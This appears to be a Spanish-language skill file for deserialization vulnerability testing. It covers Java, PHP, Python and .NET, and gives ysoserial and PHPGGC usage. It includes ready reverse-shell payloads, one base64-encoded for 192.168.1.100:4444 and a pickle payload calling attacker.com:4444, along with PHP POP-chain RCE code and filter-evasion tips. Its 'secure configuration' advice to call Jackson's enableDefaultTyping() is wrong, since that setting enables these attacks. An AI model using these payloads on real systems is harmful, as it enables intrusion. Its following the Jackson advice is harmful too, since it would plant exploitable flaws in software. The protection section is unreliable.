---
name: deserialization-testing
description: Habilidades profesionales y metodología para pruebas de vulnerabilidad de deserialización
version: 1.0.0
---

# Pruebas de vulnerabilidad de deserialización

## Descripción general

La vulnerabilidad de deserialización es una vulnerabilidad causada por la deserialización de datos no confiables por parte de una aplicación, lo que puede llevar a la ejecución remota de código, denegación de servicio, etc. Esta habilidad proporciona métodos para la detección, explotación y protección de vulnerabilidades de deserialización.

## Principio de la vulnerabilidad

Cuando una aplicación deserializa datos serializados en objetos, si la fuente de los datos no es confiable, un atacante puede construir datos serializados maliciosos para ejecutar código arbitrario durante el proceso de deserialización.

## Formatos comunes

### Java

**Bibliotecas comunes:**
- Serialización nativa de Java
- Jackson
- Fastjson
- XStream
- Apache Commons Collections

### PHP

**Funciones comunes:**
- unserialize()
- json_decode()

### Python

**Módulos comunes:**
- pickle
- yaml
- json

### .NET

**Clases comunes:**
- BinaryFormatter
- SoapFormatter
- DataContractSerializer

## Métodos de prueba

### 1. Identificar datos serializados

**Características de serialización en Java:**
```
AC ED 00 05 (Hexadecimal)
rO0 (Base64)
```

**Características de serialización en PHP:**
```
O:8:"stdClass"
a:2:{s:4:"test";s:4:"data";}
```

**Características de pickle en Python:**
```
\x80\x03
```

### 2. Detectar puntos de deserialización

**Ubicaciones comunes:**
- Valores de Cookie
- Datos de Session
- Parámetros de API
- Carga de archivos
- Datos en caché
- Colas de mensajes

### 3. Deserialización en Java

**Explotación de Apache Commons Collections:**
```java
// Usar ysoserial para generar el Payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
```

**Cadenas de Gadget comunes:**
- CommonsCollections1-7
- Spring1-2
- ROME
- Jdk7u21

### 4. Deserialización en PHP

**Prueba básica:**
```php
<?php
class Test {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}
echo serialize(new Test());
// O:4:"Test":1:{s:3:"cmd";s:2:"id";}
?>
```

**Explotación de métodos mágicos:**
- __destruct()
- __wakeup()
- __toString()
- __call()

### 5. Python pickle

**Prueba básica:**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

pickle.dumps(RCE())
```

## Técnicas de explotación

### RCE en Java

**Uso de ysoserial:**
```bash
# Generar Payload
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" > payload.bin

# Codificación Base64
base64 -w 0 payload.bin
```

**Construcción manual:**
```java
// Usar cadena de Gadget para construir un objeto malicioso
// Referencia al código fuente de ysoserial
```

### RCE en PHP

**Explotación de cadena POP:**
```php
<?php
class A {
    public $b;
    function __destruct() {
        $this->b->test();
    }
}

class B {
    public $c;
    function test() {
        call_user_func($this->c, "id");
    }
}

$a = new A();
$a->b = new B();
$a->b->c = "system";
echo serialize($a);
?>
```

### RCE en Python

**RCE con Pickle:**
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

## Técnicas de evasión

### Evasión por codificación

**Codificación Base64:**
```
Original: rO0ABXNy...
Codificado: ck8wQUJYTnk...
```

**Codificación URL:**
```
%72%4F%00%AB...
```

### Evasión de filtros

**Uso de diferentes cadenas de Gadget:**
- Si CommonsCollections está filtrado, intenta con Spring
- Si una versión específica está filtrada, intenta con otras versiones

### Ofuscación de nombres de clases

**Uso de reflexión:**
```java
Class.forName("java.lang.Runtime").getMethod("exec", String.class)
```

## Uso de herramientas

### ysoserial

```bash
# Listar Gadgets disponibles
java -jar ysoserial.jar

# Generar Payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin

# Generar Base64
java -jar ysoserial.jar CommonsCollections1 "command" | base64
```

### PHPGGC

```bash
# Listar Gadgets disponibles
./phpggc -l

# Generar Payload
./phpggc Monolog/RCE1 system id

# Generar Payload codificado
./phpggc -b Monolog/RCE1 system id
```

### Burp Suite

1. Interceptar la solicitud que contiene datos serializados
2. Usar un plugin para generar el Payload
3. Reemplazar los datos originales
4. Observar la respuesta

## Verificación y reporte

### Pasos de verificación

1. Confirmar que se pueden controlar los datos serializados
2. Verificar que la deserialización desencadena la ejecución de código
3. Evaluar el impacto (RCE, fuga de datos, etc.)
4. Registrar la PoC completa

### Puntos clave del reporte

- Ubicación de la vulnerabilidad y formato de los datos serializados
- Cadena de Gadget utilizada o método de explotación
- Pasos completos de explotación y PoC
- Sugerencias de remediación (validación de entrada, uso de serialización segura, etc.)

## Medidas de protección

### Soluciones recomendadas

1. **Evitar deserializar datos no confiables**
   - Usar JSON como alternativa
   - Usar formatos de serialización seguros

2. **Validación de entrada**
   ```java
   // Lista blanca para validar nombres de clases
   private static final Set<String> ALLOWED_CLASSES = 
       Set.of("com.example.SafeClass");
   
   private Object readObject(ObjectInputStream ois) {
       // Validar nombre de clase
       // ...
   }
   ```

3. **Uso de configuración segura**
   ```java
   // Configuración de Jackson
   objectMapper.enableDefaultTyping();
   objectMapper.setVisibility(PropertyAccessor.FIELD, 
       JsonAutoDetect.Visibility.ANY);
   ```

4. **Aislamiento del cargador de clases**
   - Usar un ClassLoader personalizado
   - Limitar las clases que se pueden cargar

5. **Monitoreo y registros**
   - Registrar operaciones de deserialización
   - Monitorear comportamientos anómalos

## Consideraciones

- Realizar solo en entornos de pruebas de seguridad autorizados
- Prestar atención a las diferencias en las cadenas de Gadget de diferentes versiones de bibliotecas
- Prestar atención a los límites de tamaño del Payload durante las pruebas
- Conocer las versiones de las bibliotecas dependientes de la aplicación objetivo